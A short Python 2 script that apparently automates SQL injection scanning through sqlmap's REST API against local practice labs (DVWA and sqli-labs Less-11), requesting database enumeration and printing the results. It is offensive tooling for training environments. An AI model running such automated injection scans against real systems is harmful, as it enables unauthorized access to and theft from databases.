#!/usr/bin/env python

import requests
import json
from time import sleep


cookies = "security=low; PHPSESSID=2ldsm8skp3iuqhe075rkmneso3"
url = "http://127.0.0.1/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit#"
url = 'http://127.0.0.1/sqli-labs/Less-11/'
api_url = "http://192.168.10.147:8775"

def getcookies(cookie):
    # document.cookie ->requests.cookie
    each_cookie = cookie.split(";")
    cookies = {}
    for i in range(len(each_cookie)):
        each = each_cookie[i].split("=")
        each_b = each[0].strip(" ")
        each_a = each[1].strip(" ")
        cookies[each_b] = str(each_a)
    print  dict(cookies)
    return dict(cookies)

r = requests.post(url, cookies=getcookies(cookies))
id  = json.loads(requests.get(api_url + '/task/new').text)['taskid']
print id
content = {'url':url}
content['data'] = 'uname=11&passwd=11&submit=Submit'
content['getDbs']  = True
print content

r = requests.post(api_url + '/option/' + str(id) + '/set', data = json.dumps(content), headers={'Content-Type':'application/json'})

r_start = requests.post(api_url + '/scan/' + str(id) + '/start', data=json.dumps({}), headers={'Content-Type':'application/json'})
print r_start.json()
while json.loads(requests.get(api_url + '/scan/' + str(id) + '/status').text)['status'] != 'terminated':
    sleep(1)
print requests.get(api_url + '/scan/' + str(id) + '/data').text
